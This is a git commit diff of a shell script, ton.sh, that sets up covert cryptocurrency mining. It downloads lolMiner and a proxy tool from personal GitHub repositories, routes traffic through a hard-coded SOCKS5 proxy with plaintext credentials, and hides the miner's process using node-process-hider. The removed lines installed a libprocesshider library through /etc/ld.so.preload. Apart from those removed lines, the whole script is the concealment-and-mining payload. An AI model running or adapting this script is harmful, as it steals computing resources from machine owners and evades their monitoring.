4f030ce7270273480561dcf85a7aa382f3590382
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-05-18 20:40:33 -0600

    Update ton.sh

--- ton.sh
+++ ton.sh
@@ -1,47 +1,43 @@
-#!/bin/sh
+apt update && apt -y install sudo wget curl unzip
+
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 104.227.76.30:6127
-socks5_username = sikencot
-socks5_password = mbah2237
+socks5 =  45.140.13.119:9132 
+socks5_username = hamqehvl
+socks5_password = awoxl1s1e87n
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
-echo " "
-echo " "
-
-echo ""
-
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
-echo " "
-
-echo ""
 
 echo " "
-echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/githuboneheart/-/main/views/bezzHash
-chmod +x bezzHash
+./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/lolMiner
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./graftcp/graftcp ./bezzHash --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user teguhcong.$(echo $(shuf -i 10-40 -n 1)-MAGIC)
+chmod +x lolMiner
+
+ph add lolMiner
+
+./graftcp/graftcp ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user teguhcong.$(echo $(shuf -i 10-40 -n 1)-MAGIC)
